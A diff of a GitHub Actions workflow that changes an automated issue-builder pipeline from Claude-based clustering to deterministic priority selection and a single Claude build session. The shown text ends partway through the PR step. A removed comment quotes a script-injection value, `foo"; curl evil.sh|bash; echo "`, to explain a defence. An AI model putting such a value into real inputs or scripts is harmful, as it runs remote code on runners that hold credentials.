@@ -1,39 +1,31 @@
-name: Issue build — select buildable issues, cluster related ones, one PR per cluster (reusable)
+name: Issue build — grab top-priority issues, one builder, one PR (reusable)
 
-# The BUILDER — second and final stage of the backlog pipeline (propose -> build).
-# fixer.yml proposes work as issues; this selects the buildable ones, groups related ones,
-# and ships a PR per group. As of the three-loop rework (docs/design/three-loop-pipeline.md,
-# 2026-07-15) the separate Opus `triage` stage is gone: its buildable-vs-needs-human call
-# folded into this workflow's read-only cluster pass, and the whole `confidence:high|medium|low`
-# taxonomy was deleted. It became dead weight once `automerge.yml` stopped reading labels —
-# a PR now auto-merges on green + not-`hold`, so confidence gated nothing.
+# The BUILDER — second stage of the backlog pipeline (fixer proposes -> this builds).
+# Rewritten 2026-07-15 (docs/design/three-loop-pipeline.md): the fragile Claude "cluster"
+# pass is GONE. It asked one read-only session to view up to 50 candidates and emit a
+# grouping plan as structured output in 12 turns — it couldn't, ended without the tool
+# call, and the run built nothing. Collation and building are the same act, so we don't
+# split them: hand the top-priority issues to ONE builder and it collates for free while
+# it plans the work.
 #
-# NEVER WAITS, ALWAYS BUILDS >=1: every run, if any buildable issue exists, this produces at
-# least one PR. There is no "wait for a confidence-pure cluster" gate (the old behavior that
-# let the builder sit idle burning scan passes). n issues -> m clusters, never n -> 1.
+# GRAB TOP TIER, ALWAYS BUILD:
+#   1. select (deterministic shell — no LLM): from open buildable issues (trusted author,
+#      not building/hold/needs-human), take the highest NON-EMPTY priority tier —
+#      HIGH (`priority:high` or `security`) else MED (`priority:med`) else LOW (everything
+#      else — the floor, so there is always something to build). Cap oldest-first at
+#      `max-issues`. Claim each (`building`) so a concurrent run can't double-process it.
+#      Pick the build model from the BATCH's complexity (high tier / large bodies / big
+#      batch -> complex-model; else simple-model) and scale turns by the count.
+#   2. build (ONE job — not a matrix): one Claude session gets all N issue numbers, makes
+#      the optimal build plan, implements them as ONE coherent change (fanning out to its
+#      own subagents for issues that are independent), runs the repo's gates, and opens ONE
+#      PR that Closes every issue. The PR flows into the normal auto-merge path
+#      (automerge.yml arms it on green + not-`hold`). No commit -> claims released, retried
+#      next run.
 #
-# Two jobs:
-#   cluster — a deterministic shell step selects open BUILD CANDIDATES (open, trusted author,
-#             not building/hold/needs-human). One read-only Claude session then, per candidate:
-#             judges buildable-vs-not, and groups the buildable ones into clusters by shared
-#             signal — same files/tree, same root cause/concept, or filed in the same window.
-#             It returns {clusters, needs_human} via --json-schema structured_output (never a
-#             written file — see README's structured_output gotcha). A deterministic shell step
-#             then labels the non-buildable ones `needs-human` and claims each clustered issue
-#             (adds `building`) so a concurrent run can't double-process it. Capped at
-#             MAX_CLUSTERS; truncation is logged (the rest are simply re-evaluated next run).
-#   build   — matrix, one job per cluster (native Actions fan-out, no worktree juggling).
-#             Fresh branch off the default branch, Claude implements the cluster's issues, runs
-#             the repo's gates, pushes, opens a PR that Closes the source issues. The PR flows
-#             into the normal auto-merge path (automerge.yml arms it on green; add `hold` to
-#             stop that). If the gates don't pass, no PR opens — the issues get a comment and
-#             their `building` claim is dropped so a later run retries them.
-#
-# Safe Outputs shape: every model step is READ-ONLY and returns structured data; the only
-# label/issue/PR mutations happen in deterministic shell steps. See docs/design/backlog-pipeline.md.
-#
-# Runs on a Claude Pro/Max subscription (CLAUDE_CODE_OAUTH_TOKEN), not a metered
-# ANTHROPIC_API_KEY — inert until that secret is set.
+# Safe Outputs: the only issue/PR/label mutations are in deterministic shell; the model
+# step writes code on a throwaway branch that a human/CI gates before merge.
+# Subscription auth (CLAUDE_CODE_OAUTH_TOKEN) — inert until that secret is set.
 #
 # Caller (batched schedule + manual dispatch — NOT an `issues:` trigger; per-event fan-out
 # caused the 77-parallel-session incident, SuxOS/.github#140):
@@ -44,32 +36,47 @@ name: Issue build — select buildable issues, cluster related ones, one PR per 
 on:
   workflow_call:
     inputs:
-      max-clusters:
+      # --- KNOBS: all deterministic (the orchestrator must be deterministic even though the
+      #     builder isn't). include/exclude/max-issues/model-hint/speed are applied in the
+      #     shell select step; only `fan` reaches the model, as a planning hint. ---
+      max-issues:
+        description: "Batch-size max: issues pulled into one build/PR per run, oldest-first within the chosen tier."
         type: number
-        # Per-run build fan-out cap (truncation logged; the rest are re-evaluated next run).
-        # Bounds spend, never safety.
-        default: 20
-      max-candidates:
-        description: "Cap open issues fed to the cluster pass per run, oldest-first — bounds the model's input size and per-run spend; the rest wait for the next run."
+        default: 8
+      include:
+        description: "Comma-list of labels; if set, only issues carrying at least one are eligible (also does priority, e.g. `priority:high` or `bug,security`)."
+        type: string
+        default: ""
+      exclude:
+        description: "Comma-list of labels; issues carrying any are dropped (e.g. `enhancement,wontfix`)."
+        type: string
+        default: ""
+      model-hint:
+        description: "`auto` = pick model from batch complexity; or force `opus`/`sonnet`/`haiku`."
+        type: string
+        default: "auto"
+      speed:
+        description: "`thorough` = full turn budget; `fast` = trimmed (cheaper, quicker)."
+        type: string
+        default: "thorough"
+      fan:
+        description: "`parallel` = builder fans out to subagents for independent issues; `serial` = one at a time."
+        type: string
+        default: "parallel"
+      simple-model:
+        description: "Model for a small/simple batch when model-hint=auto."
+        type: string
+        default: "sonnet"
+      complex-model:
+        description: "Model for a high-tier / large / security batch when model-hint=auto."
+        type: string
+        default: "opus"
+      base-max-turns:
+        description: "Turn budget floor for the build session; scaled up by issue count, then by speed."
         type: number
         default: 50
-      cluster-model:
-        type: string
-        # sonnet: this pass now does buildability triage + grouping, but neither authorizes an
-        # unattended merge anymore (CI + security-review gate every merge) — so it's bulk-tier
-        # judgment, not the old merge-gating Opus call. See docs/design/three-loop-pipeline.md.
-        default: "sonnet"
-      build-model:
-        type: string
-        # sonnet: build output is gated by CI + security-review on the resulting PR, and Sonnet
-        # is near-Opus on codegen at a fraction of the subscription budget. Scarce Opus budget
-        # goes to the nightly deep-audit / weekly org-consistency passes instead.
-        default: "sonnet"
-      build-max-turns:
-        type: number
-        default: 60
       gates-summary:
-        description: "Human-readable list of gates each build session's change must pass before it pushes."
+        description: "Human-readable list of gates the change must pass before it pushes."
         type: string
         default: "the repo's lint/type-check/test/build commands"
 
@@ -84,15 +91,17 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  cluster:
+  select:
     runs-on: ubuntu-latest
-    timeout-minutes: 15
-    # Narrower than the workflow-level grant: this job only reads issues (via its own minted
-    # App token) and checks out read-only. The build job below keeps the broad write grant.
+    timeout-minutes: 10
     permissions:
       contents: read
     outputs:
-      plan: ${{ steps.plan.outputs.clusters }}
+      numbers: ${{ steps.pick.outputs.numbers }}
+      count: ${{ steps.pick.outputs.count }}
+      tier: ${{ steps.pick.outputs.tier }}
+      model: ${{ steps.pick.outputs.model }}
+      turns: ${{ steps.pick.outputs.turns }}
     steps:
       - name: Preflight — need the token
         id: pre
@@ -101,9 +110,7 @@ jobs:
             echo "CLAUDE_CODE_OAUTH_TOKEN not set → issue-build inert"; echo "go=false" >> "$GITHUB_OUTPUT"
           else echo "go=true" >> "$GITHUB_OUTPUT"; fi
 
-      # Budget governor signal (docs/design/budget-and-cadence.md). Builds drain the in-flight
-      # backlog, so they keep running at yellow and stand down only at red. Gating the cluster
-      # job gates the whole workflow: no plan → empty build matrix.
+      # Builds drain the in-flight backlog, so they run at yellow and stand down only at red.
       - name: Check autonomy throttle
         id: throttle
         uses: SuxOS/.github/.github/actions/check-throttle@main
@@ -119,25 +126,26 @@ jobs:
           app-id: ${{ secrets.SUX_BOT_APP_ID }}
           private-key: ${{ secrets.SUX_BOT_PRIVATE_KEY }}
 
-      # Reap orphaned claims + select this run's candidates, BEFORE the expensive Claude call.
-      #  1. Reap: an issue stuck in `building` with no activity for >REAP_STALE_HOURS is an
-      #     orphan from a build run that crashed after claiming but before opening its PR —
-      #     drop the claim so it's a candidate again. (Self-healing; no separate cron.)
-      #  2. Select: open issues from a TRUSTED author (the org bot's proposals, or an
-      #     OWNER/MEMBER/COLLABORATOR — the actor gate, since an untriaged issue body is
-      #     attacker-influenceable input into an autonomous build), carrying none of
-      #     building/hold/needs-human. Capped oldest-first to MAX_CANDIDATES. If none, the
-      #     Claude call is skipped entirely (cheap exit, no LLM spend).
-      - name: Reap stale claims and select build candidates
-        id: queue
+      - name: Reap stale claims, then select the top-priority build batch
+        id: pick
         if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true'
         env:
           GH_TOKEN: ${{ steps.app-token.outputs.token }}
           REAP_STALE_HOURS: "2"
-          MAX_CANDIDATES: ${{ inputs.max-candidates }}
+          MAX_ISSUES: ${{ inputs.max-issues }}
+          INCLUDE: ${{ inputs.include }}
+          EXCLUDE: ${{ inputs.exclude }}
+          MODEL_HINT: ${{ inputs.model-hint }}
+          SPEED: ${{ inputs.speed }}
+          SIMPLE_MODEL: ${{ inputs.simple-model }}
+          COMPLEX_MODEL: ${{ inputs.complex-model }}
+          BASE_TURNS: ${{ inputs.base-max-turns }}
         run: |
           set -euo pipefail
           now=$(date -u +%s)
+
+          # 1. Reap: an issue stuck in `building` with no activity for >REAP_STALE_HOURS is an
+          #    orphan from a build run that crashed after claiming — drop the claim (self-healing).
           if ! stale_rows=$(gh issue list --repo "$GITHUB_REPOSITORY" --state open --label building \
               --json number,updatedAt --jq '.[] | [.number,.updatedAt] | @tsv'); then
             echo "::error::gh issue list (label:building) failed — aborting instead of silently skipping the reap"
@@ -153,194 +161,84 @@ jobs:
             done <<< "$stale_rows"
           fi
 
-          # `gh issue list --json` has no author_association field, so read the REST issues
-          # endpoint (it returns it per-issue) and exclude entries with a `pull_request` key
-          # (that endpoint lists PRs too). A label-set predicate is more robust than a search
-          # string. Cap oldest-first so a proposal burst can't blow the budget in one run.
+          # 2. Select. REST issues endpoint (has author_association; also lists PRs, so drop
+          #    entries with a pull_request key). Partition buildable candidates into priority
+          #    tiers and take the highest NON-EMPTY one — HIGH else MED else LOW (floor).
           if ! all=$(gh api "repos/${GITHUB_REPOSITORY}/issues?state=open&per_page=100" --paginate); then
             echo "::error::gh api issues list failed — aborting instead of treating as zero candidates"
             exit 1
           fi
-          picked=$(printf '%s' "$all" | jq -sc --argjson n "$MAX_CANDIDATES" '
-            [ .[][]
-              | select(has("pull_request") | not)
+
+          # include/exclude are comma-lists; empty means "no filter" (jq: empty split -> [""],
+          # guarded so an unset knob never accidentally matches/excludes everything).
+          include_csv="${INCLUDE:-}"; exclude_csv="${EXCLUDE:-}"
+
+          plan=$(printf '%s' "$all" | jq -sc --argjson n "$MAX_ISSUES" \
+              --arg include "$include_csv" --arg exclude "$exclude_csv" '
+            ($include | if length > 0 then split(",") else [] end) as $inc
+            | ($exclude | if length > 0 then split(",") else [] end) as $exc
+            | def buildable:
+              select(has("pull_request") | not)
               | (.labels | map(.name)) as $l
               | select(([ "building","hold","needs-human" ] - $l) | length == 3)
               | select((.author_association | IN("OWNER","MEMBER","COLLABORATOR")) or (.user.login == "suxbot[bot]"))
-            ] | sort_by(.number) | .[0:$n] | map(.number)')
-          count=$(echo "$picked" | jq 'length')
-          echo "build candidates ($count): $picked"
-          echo "numbers=$picked" >> "$GITHUB_OUTPUT"
-          echo "count=$count" >> "$GITHUB_OUTPUT"
+              | select(($inc | length) == 0 or (($inc - $l) | length) < ($inc | length))
+              | select(($exc | length) == 0 or (($exc - $l) | length) == ($exc | length));
+            [ .[][] | buildable | { number, body, labels: (.labels | map(.name)) } ] as $c
+            | ($c | map(select((.labels | any(. == "priority:high" or . == "security"))))) as $high
+            | ($c | map(select(.labels | any(. == "priority:med")))) as $med
+            | ($c | map(select((.labels | any(. == "priority:high" or . == "security" or . == "priority:med")) | not))) as $low
+            | (if   ($high|length) > 0 then {tier:"high", set:$high}
+               elif ($med|length)  > 0 then {tier:"med",  set:$med}
+               else                          {tier:"low",  set:$low} end) as $chosen
+            | ($chosen.set | sort_by(.number) | .[0:$n]) as $picked
+            | { tier: $chosen.tier,
+                numbers: ($picked | map(.number)),
+                count: ($picked | length),
+                bodysize: ($picked | map((.body // "") | length) | add // 0) }')
 
-      - name: Checkout
-        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0'
-        # Default (shallow) depth: this job's allowedTools is gh/issue read only — no git.
-        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+          tier=$(echo "$plan" | jq -r '.tier')
+          numbers=$(echo "$plan" | jq -c '.numbers')
+          count=$(echo "$plan" | jq -r '.count')
+          bodysize=$(echo "$plan" | jq -r '.bodysize')
+          echo "selected tier=$tier count=$count issues=$numbers"
 
-      - name: Claude — triage buildability and cluster the backlog
-        id: claude
-        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0'
-        # The action hard-fails (exit 1) when the model ends its turn without emitting
-        # --json-schema structured_output. continue-on-error lets "Cap and claim" below treat
-        # an empty verdict as clusters=[] (build job skips cleanly). Same shape as #139.
-        continue-on-error: true
-        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
-        env:
-          CANDIDATE_NUMBERS: ${{ steps.queue.outputs.numbers }}
-          ENABLE_PROMPT_CACHING_1H: "1"
-        with:
-          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
-          github_token: ${{ steps.app-token.outputs.token }}
-          allowed_bots: suxbot[bot]
-          prompt: |
-            These open issues are build candidates: $CANDIDATE_NUMBERS
-            View each with `gh issue view <n> --json number,title,body,labels` and read enough of
-            the code to judge it. Whoever filed it (the fixer bot or a human) is irrelevant — judge
-            the substance.
-
-            Do TWO things:
-
-            1. BUILDABILITY. For each candidate decide: can an unattended coding session actually
-               ship this? DEFAULT TO YES — the aim is that most work drains autonomously, and CI +
-               security-review gate every resulting PR, so you don't need certainty to let it
-               through. Mark an issue non-buildable ONLY when a session genuinely can't do it: a
-               question, a duplicate, needs credentials/private access/a human decision, or too
-               vague or sprawling to attempt safely. Put non-buildable ones in `needs_human` with a
-               one-line `reason`; leave everything else for clustering.
-
-            2. CLUSTER the buildable ones. Group RELATED issues — same files/tree, same root cause
-               or feature area, or a dependency between them — so each cluster becomes one small,
-               coherent, reviewable PR. Two issues that would touch the same files MUST share a
-               cluster (concurrent sessions editing the same lines just collide). Two unrelated
-               issues MUST NOT. An issue related to nothing is its own single-issue cluster —
-               but before making a singleton, actively check it against the others for a shared
-               signal and group it if one exists. Never put everything in one cluster: n issues
-               -> m clusters, m > 1 whenever the backlog holds unrelated work.
-
-            For each cluster: a short kebab-case `id`, a `branch` like `bot/issue-build-<id>`, a
-            conventional-commit `title` for the PR, a one-paragraph `summary`, and its
-            `issue_numbers`. Do not modify any issue and do not write code here.
-
-            Your FINAL message MUST be the machine-readable object matching the JSON schema:
-            {"clusters":[...],"needs_human":[...]} — empty arrays if nothing applies. Emit it as
-            your structured output; do NOT end with a prose summary and do NOT write any file. A
-            run that ends without this object builds nothing and wastes the session.
-          # Read-only: views issues, returns a plan. All mutation is in the deterministic shell
-          # step below. Restrict tools to read + the `gh issue` read subcommands it calls.
-          claude_args: >-
-            --max-turns 12 --model ${{ inputs.cluster-model }}
-            --allowedTools "Read,Grep,Glob,Bash(gh issue list:*),Bash(gh issue view:*)"
-            --json-schema '{"type":"object","properties":{"clusters":{"type":"array","items":{"type":"object","properties":{"id":{"type":"string"},"branch":{"type":"string"},"title":{"type":"string"},"summary":{"type":"string"},"issue_numbers":{"type":"array","items":{"type":"integer"}}},"required":["id","branch","title","summary","issue_numbers"],"additionalProperties":false}},"needs_human":{"type":"array","items":{"type":"object","properties":{"number":{"type":"integer"},"reason":{"type":"string"}},"required":["number","reason"],"additionalProperties":false}}},"required":["clusters","needs_human"],"additionalProperties":false}'
-
-      - name: Claude — triage buildability and cluster (retry — first attempt produced no output)
-        id: claude_retry
-        # Fires only when the first attempt emitted no structured_output — a transient blip or a
-        # model that ended without the tool call. One retry auto-recovers; a genuinely empty pass
-        # still yields nothing and the Cap step sets clusters=[]. Mirrors #139.
-        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0' && steps.claude.outputs.structured_output == ''
-        continue-on-error: true
-        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
-        env:
-          CANDIDATE_NUMBERS: ${{ steps.queue.outputs.numbers }}
-          ENABLE_PROMPT_CACHING_1H: "1"
-        with:
-          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
-          github_token: ${{ steps.app-token.outputs.token }}
-          allowed_bots: suxbot[bot]
-          prompt: |
-            These open issues are build candidates: $CANDIDATE_NUMBERS
-            View each with `gh issue view <n> --json number,title,body,labels` and read enough of
-            the code to judge it. Whoever filed it (the fixer bot or a human) is irrelevant — judge
-            the substance.
-
-            Do TWO things:
-
-            1. BUILDABILITY. For each candidate decide: can an unattended coding session actually
-               ship this? DEFAULT TO YES — the aim is that most work drains autonomously, and CI +
-               security-review gate every resulting PR, so you don't need certainty to let it
-               through. Mark an issue non-buildable ONLY when a session genuinely can't do it: a
-               question, a duplicate, needs credentials/private access/a human decision, or too
-               vague or sprawling to attempt safely. Put non-buildable ones in `needs_human` with a
-               one-line `reason`; leave everything else for clustering.
-
-            2. CLUSTER the buildable ones. Group RELATED issues — same files/tree, same root cause
-               or feature area, or a dependency between them — so each cluster becomes one small,
-               coherent, reviewable PR. Two issues that would touch the same files MUST share a
-               cluster (concurrent sessions editing the same lines just collide). Two unrelated
-               issues MUST NOT. An issue related to nothing is its own single-issue cluster —
-               but before making a singleton, actively check it against the others for a shared
-               signal and group it if one exists. Never put everything in one cluster: n issues
-               -> m clusters, m > 1 whenever the backlog holds unrelated work.
-
-            For each cluster: a short kebab-case `id`, a `branch` like `bot/issue-build-<id>`, a
-            conventional-commit `title` for the PR, a one-paragraph `summary`, and its
-            `issue_numbers`. Do not modify any issue and do not write code here.
-
-            Your FINAL message MUST be the machine-readable object matching the JSON schema:
-            {"clusters":[...],"needs_human":[...]} — empty arrays if nothing applies. Emit it as
-            your structured output; do NOT end with a prose summary and do NOT write any file. A
-            run that ends without this object builds nothing and wastes the session.
-          claude_args: >-
-            --max-turns 12 --model ${{ inputs.cluster-model }}
-            --allowedTools "Read,Grep,Glob,Bash(gh issue list:*),Bash(gh issue view:*)"
-            --json-schema '{"type":"object","properties":{"clusters":{"type":"array","items":{"type":"object","properties":{"id":{"type":"string"},"branch":{"type":"string"},"title":{"type":"string"},"summary":{"type":"string"},"issue_numbers":{"type":"array","items":{"type":"integer"}}},"required":["id","branch","title","summary","issue_numbers"],"additionalProperties":false}},"needs_human":{"type":"array","items":{"type":"object","properties":{"number":{"type":"integer"},"reason":{"type":"string"}},"required":["number","reason"],"additionalProperties":false}}},"required":["clusters","needs_human"],"additionalProperties":false}'
-
-      - name: Cap cluster count, mark needs-human, claim clustered issues
-        id: plan
-        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0'
-        env:
-          GH_TOKEN: ${{ steps.app-token.outputs.token }}
-          # Read from whichever attempt produced output (retry only ran if the first was empty).
-          VERDICT: ${{ steps.claude.outputs.structured_output || steps.claude_retry.outputs.structured_output }}
-          MAX_CLUSTERS: ${{ inputs.max-clusters }}
-        run: |
-          set -euo pipefail
-          if [ -z "${VERDICT:-}" ]; then echo "no structured output → nothing to build"; echo "clusters=[]" >> "$GITHUB_OUTPUT"; exit 0; fi
-
-          # Label the non-buildable ones needs-human (excluded from candidate selection next run)
-          # and comment why, so they're not re-evaluated every run but a human sees them.
-          echo "$VERDICT" | jq -c '.needs_human[]?' | while read -r nh; do
-            n=$(echo "$nh" | jq -r '.number')
-            reason=$(echo "$nh" | jq -r '.reason // ""')
-            gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --add-label needs-human 2>/dev/null || true
-            if [ -n "$reason" ]; then
-              gh issue comment "$n" --repo "$GITHUB_REPOSITORY" \
-                --body "🤖 Held off autonomous build: $reason (labeled \`needs-human\`). Remove the label to let the builder retry it." 2>/dev/null || true
+          # Model: model-hint=auto picks from BATCH complexity (high tier, a big batch, or
+          # lots of prose earns the complex model); any other value forces that model.
+          if [ "$MODEL_HINT" = "auto" ]; then
+            model="$SIMPLE_MODEL"
+            if [ "$tier" = "high" ] || [ "$count" -ge 6 ] || [ "$bodysize" -ge 6000 ]; then
+              model="$COMPLEX_MODEL"
             fi
-            echo "issue #$n → needs-human ($reason)"
-          done
-
-          total=$(echo "$VERDICT" | jq '.clusters | length')
-          capped=$(echo "$VERDICT" | jq -c --argjson n "$MAX_CLUSTERS" '.clusters[0:$n]')
-          kept=$(echo "$capped" | jq 'length')
-          if [ "$kept" -lt "$total" ]; then
-            echo "::warning::clustering plan had $total clusters, capped to $MAX_CLUSTERS — the rest are re-evaluated next run"
+          else
+            model="$MODEL_HINT"
           fi
-          echo "clusters ($kept): $(echo "$capped" | jq -c '[.[] | {id,issue_numbers}]')"
 
-          # Claim each clustered issue (add `building`) so a concurrent run can't double-process it.
-          echo "$capped" | jq -c '.[]' | while read -r c; do
-            for n in $(echo "$c" | jq -r '.issue_numbers[]'); do
-              gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --add-label building 2>/dev/null || true
-            done
+          # Turns scale with issue count, then speed: fast halves the budget (cheaper,
+          # quicker, less exploration); thorough (default) keeps the full scaled budget.
+          turns=$(( BASE_TURNS + 20 * count ))
+          [ "$SPEED" = "fast" ] && turns=$(( turns / 2 ))
+          [ "$turns" -lt 10 ] && turns=10
+          [ "$turns" -gt 300 ] && turns=300
+
+          # Claim each selected issue so a concurrent run can't double-process it.
+          for i in $(echo "$numbers" | jq -r '.[]'); do
+            gh issue edit "$i" --repo "$GITHUB_REPOSITORY" --add-label building 2>/dev/null || true
           done
 
-          echo "clusters=$capped" >> "$GITHUB_OUTPUT"
+          {
+            echo "numbers=$numbers"
+            echo "count=$count"
+            echo "tier=$tier"
+            echo "model=$model"
+            echo "turns=$turns"
+          } >> "$GITHUB_OUTPUT"
 
   build:
-    needs: cluster
-    if: needs.cluster.outputs.plan != '' && needs.cluster.outputs.plan != '[]'
-    strategy:
-      fail-fast: false
-      matrix:
-        # Default an EMPTY plan to '[]' before fromJSON. The matrix expression is evaluated at
-        # job-setup time regardless of the job `if:`, so a cheap-exit run (no candidates → no
-        # cluster output → plan is '') would hit fromJSON('') and fail the WHOLE run with
-        # startup_failure. `|| '[]'` yields a valid empty array (zero matrix jobs) instead.
-        include: ${{ fromJSON(needs.cluster.outputs.plan || '[]') }}
+    needs: select
+    if: needs.select.outputs.count != '' && needs.select.outputs.count != '0'
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 45
     steps:
       - name: Mint app token
         id: app-token
@@ -349,86 +247,83 @@ jobs:
           app-id: ${{ secrets.SUX_BOT_APP_ID }}
           private-key: ${{ secrets.SUX_BOT_PRIVATE_KEY }}
 
-      - name: Checkout default branch, create cluster branch
+      - name: Checkout default branch
         uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
         with:
           fetch-depth: 0
           token: ${{ steps.app-token.outputs.token }}
 
-      - name: Create branch
+      - name: Create build branch
+        id: branch
         env:
-          BRANCH: ${{ matrix.branch }}
-        # BRANCH is Claude-authored (the cluster job's structured output, only constrained to
-        # `"type":"string"` by the schema) — it MUST go through env: rather than inline ${{ }}
-        # interpolation into run:, which would be a script injection (a value like
-        # `foo"; curl evil.sh|bash; echo "` executing arbitrary commands on a runner holding the
-        # App token). The pattern check is defense-in-depth: also refuses a value colliding with
-        # a real branch (e.g. "main"), which would silently commit onto it.
+          # Deterministic + unique per run — no model-authored value in the branch name, so no
+          # injection surface (unlike the old cluster-authored branch).
+          BRANCH: bot/issue-build-${{ github.run_id }}
         run: |
           set -euo pipefail
-          if ! [[ "$BRANCH" =~ ^bot/issue-build-[A-Za-z0-9._-]+$ ]]; then
-            echo "::error::cluster branch name '$BRANCH' doesn't match the expected bot/issue-build-<id> pattern — refusing to check it out"
-            exit 1
-          fi
           git checkout -B "$BRANCH"
+          echo "name=$BRANCH" >> "$GITHUB_OUTPUT"
 
-      - name: Claude — implement the cluster
+      - name: Claude — plan and build the batch into one PR
         id: claude
-        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
         env:
-          ISSUE_NUMBERS: ${{ join(matrix.issue_numbers, ', ') }}
-          CLUSTER_SUMMARY: ${{ matrix.summary }}
+          ISSUE_NUMBERS: ${{ needs.select.outputs.numbers }}
+          TIER: ${{ needs.select.outputs.tier }}
+          COUNT: ${{ needs.select.outputs.count }}
           GATES_SUMMARY: ${{ inputs.gates-summary }}
+          FAN_HINT: ${{ inputs.fan == 'serial' && 'Build ONE issue at a time, in order — do not fan out to subagents even for independent issues.' || 'Independent issues (disjoint files, no ordering dependency) can be built IN PARALLEL — fan out with the Task tool, one subagent per independent issue or group, each on its own piece.' }}
           ENABLE_PROMPT_CACHING_1H: "1"
+        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
         with:
           claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
           github_token: ${{ steps.app-token.outputs.token }}
           allowed_bots: suxbot[bot]
           prompt: |
-            Implement GitHub issues #$ISSUE_NUMBERS in this repo (read each with
-            `gh issue view <n>` for full detail). Summary of what this cluster covers:
-            $CLUSTER_SUMMARY
+            You are the builder. These $COUNT open issues (priority tier: $TIER) are yours to
+            ship in ONE pull request on the current branch: $ISSUE_NUMBERS
 
-            These issues were grouped together because they're related — implement all of
-            them as one coherent change. This repo's gates must all pass before you commit:
-              $GATES_SUMMARY
-            Make the smallest correct change for each issue, run the gates locally, then
-            commit (conventional-commit style message) and push to this branch. Do NOT touch
-            secrets, do NOT weaken a test to make it pass, do NOT touch code unrelated to
-            these issues.
+            Read each with `gh issue view <n>`. Then:
 
-            If you get all the way through and the gates pass, that's success — just finish
-            normally. If you cannot get the gates passing (a genuine design problem, missing
-            context, etc.), do NOT push a broken commit — say so clearly in your final
-            response instead, explaining what's blocking it.
-          # BUILD job: legitimately writes code and pushes a branch, so tools stay broad (no
-          # --allowedTools restriction) by design — unlike the read-only cluster job above.
-          claude_args: "--max-turns ${{ inputs.build-max-turns }} --model ${{ inputs.build-model }}"
+            1. PLAN. Work out the optimal build plan across all of them. $FAN_HINT
+               Issues that touch the same files or depend on each other are done together, in
+               order, to stay coherent. You have the whole batch in view, so collate naturally:
+               dedupe overlapping work, and drop an issue from THIS PR if it turns out
+               unbuildable or would conflict — note which and why in your final message; it keeps
+               its claim released and gets retried later.
 
-      - name: Push and open PR, or comment + release claim on failure
+            2. BUILD. Make the smallest correct change for each issue. Do NOT touch secrets, do
+               NOT weaken a test to make it pass, do NOT touch code unrelated to these issues.
+
+            3. GATE. All of these must pass before you commit:
+               $GATES_SUMMARY
+               Commit (conventional-commit message referencing the issues) and push to this
+               branch. One coherent commit history for the batch is fine.
+
+            If you get the gates passing, finish normally — a later step opens the PR. If you
+            can't get them green (genuine design problem, missing context), do NOT push a broken
+            commit — say so clearly in your final message and explain what's blocking it.
+          # BUILD legitimately writes code, pushes, and fans out to subagents — tools stay broad.
+          claude_args: "--max-turns ${{ needs.select.outputs.turns }} --model ${{ needs.select.outputs.model }}"
+
+      - name: Push and open ONE PR, or release claims on failure
         env:
           GH_TOKEN: ${{ steps.app-token.outputs.token }}
-          BRANCH: ${{ matrix.branch }}
-          TITLE: ${{ matrix.title }}
-          SUMMARY: ${{ matrix.summary }}
-          ISSUE_NUMBERS_JSON: ${{ toJSON(matrix.issue_numbers) }}
+          BRANCH: ${{ steps.branch.outputs.name }}
+          TIER: ${{ needs.select.outputs.tier }}
+          ISSUE_NUMBERS_JSON: ${{ needs.select.outputs.numbers }}
           RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
-          # Checkout above checked out the caller's actual default branch (not necessarily
-          # "main"); hardcoding "main" here broke the ahead-of-base check and PR creation for
-          # any caller whose default branch is named something else.
           BASE_BRANCH: ${{ github.event.repository.default_branch }}
         run: |
           set -euo pipefail
           nums=$(echo "$ISSUE_NUMBERS_JSON" | jq -r '.[]')
 
-          # The only reliable success signal is a real commit ahead of the base branch — a
-          # dirty, uncommitted working tree is ALSO a failure (Claude didn't finish committing).
+          # Only real success is a commit ahead of base — a dirty/uncommitted tree is a failure.
           if [ -z "$(git log "origin/${BASE_BRANCH}"..HEAD 2>/dev/null)" ]; then
-            echo "no commits produced for this cluster → build session reported it couldn't finish"
+            echo "no commits produced → build session couldn't finish; releasing claims"
             for n in $nums; do
               gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --remove-label building 2>/dev/null || true
               gh issue comment "$n" --repo "$GITHUB_REPOSITORY" \
-                --body "🤖 Auto-build attempted this issue as part of a cluster but couldn't get the gates passing. Released the \`building\` claim so a later run retries it. Run: $RUN_URL" 2>/dev/null || true
+                --body "🤖 Auto-build attempted this issue in a batch but couldn't get the gates green. Released the \`building\` claim so a later run retries it. Run: $RUN_URL" 2>/dev/null || true
             done
             exit 0
           fi
@@ -436,16 +331,16 @@ jobs:
           git push -f origin "$BRANCH"
 
           closes=$(for n in $nums; do echo "Closes #$n"; done)
-          body=$(printf '%s\n\n%s\n\n%s\n\nRun: %s' "$SUMMARY" "$closes" "🤖 Opened automatically by issue-build.yml." "$RUN_URL")
+          title="build: drain ${TIER}-priority backlog ($(echo "$nums" | wc -w | tr -d ' ') issues)"
+          body=$(printf 'Batch build of the %s-priority backlog.\n\n%s\n\n%s\n\nRun: %s' \
